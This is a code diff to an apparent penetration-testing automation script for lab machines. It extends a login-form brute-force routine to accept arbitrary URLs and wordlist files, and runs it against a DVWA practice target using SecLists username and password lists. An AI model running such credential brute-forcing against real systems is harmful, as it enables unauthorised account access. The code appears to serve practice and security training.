@@ -1,3 +1,4 @@
+import os.path
 import urllib
 from pathlib import Path
 from pprint import pprint
@@ -192,6 +193,16 @@ def fill_form(form: WebElement, paramMap: Dict[str, str]) -> WebElement:
     return form
 
 
+def load_lines_from_file(p: Path, encoding='ascii') -> List[str]:
+    items = []
+
+    with open(p, 'r', encoding=encoding) as f:
+        for line in f.readlines():
+            items.append(line)
+
+    return items
+
+
 class HttpModule:
     def __init__(self, box: Box):
         self.box = box
@@ -200,14 +211,17 @@ class HttpModule:
     def has_results(self):
         return False  # TODO NYI
 
-    def initial_http_scan(self, protocol='http'):
+    def build_url(self, protocol='http', slug=''):
         target = self.box.get_ip_or_hostname()
         servicePort = self.box.get_service_port(protocol)
 
         if not servicePort:
-            raise ValueError("HTTP has no service port! Examine nmap output.")
+            raise ValueError(f"{protocol} has no service port! Examine nmap output.")
 
-        target = f"{protocol}://{target}:{servicePort}/"
+        return f"{protocol}://{target}:{servicePort}/{slug}"
+
+    def initial_http_scan(self, protocol='http'):
+        target = self.build_url()
 
         print(f"target={target}")
 
@@ -221,10 +235,18 @@ class HttpModule:
             raise urle
 
     # TODO: This method is extremely long... ;_; fugg DDDD:
-    def bruteforce_login_form(
+    def bruteforce_form(
             self,
+            target_url: str = None,
+            slug: str = None,
             usernames: Union[Path, List[str]] = None,
             passwords: Union[Path, List[str]] = None) -> Tuple[str, str]:
+
+        if not target_url:
+            target_url = self.build_url()
+
+        if not slug:
+            slug = ''
 
         if not usernames:
             usernames = ['bobby', 'robby', 'admin']
@@ -233,13 +255,23 @@ class HttpModule:
             passwords = ['foobarbazqux', 'wheresthebeef', 'password']
 
         if isinstance(usernames, Path):
-            raise NotImplementedError("Load usernames from a path...")
+            usernames = load_lines_from_file(usernames)
 
-        if isinstance(usernames, Path):
-            raise NotImplementedError("Load passwords from a path...")
+        if isinstance(passwords, Path):
+            passwords = load_lines_from_file(passwords)
+
+        assert (isinstance(passwords, list))
+        assert (isinstance(passwords[0], str))
+        assert (isinstance(usernames, list))
+        assert (isinstance(usernames[0], str))
 
         if not self.has_results():
             self.initial_http_scan()
+
+        target_url += slug
+
+        print("Navigating to {}".format(target_url))
+        self.driver.get(target_url)
 
         # redirs: Dict[str, int] = self.browser.request.redirect_dict
         # if len(redirs) > 0:
@@ -313,9 +345,17 @@ def hackthe(box: Box) -> Box:
     if box.last_nmap_result().hasHTTPServer():
         print("target has an HTTP server!")
 
-        creds = box.http_scanner.bruteforce_login_form()
-
+        creds = box.http_scanner.bruteforce_form()
         print("Login form creds: {}".format(creds))
+
+        if box.name == 'dvwa':
+            creds2 = box.http_scanner.bruteforce_form(
+                slug='/vulnerabilities/brute/',
+                usernames=Path(os.path.expanduser('~/Git/SecLists/Usernames/top-usernames-shortlist.txt')),
+                passwords=Path(os.path.expanduser('~/Git/SecLists/Passwords/darkweb2017-top100.txt'))
+            )
+
+            print("DVWA bruteforce test creds: {}".format(creds2))
 
     return box
 
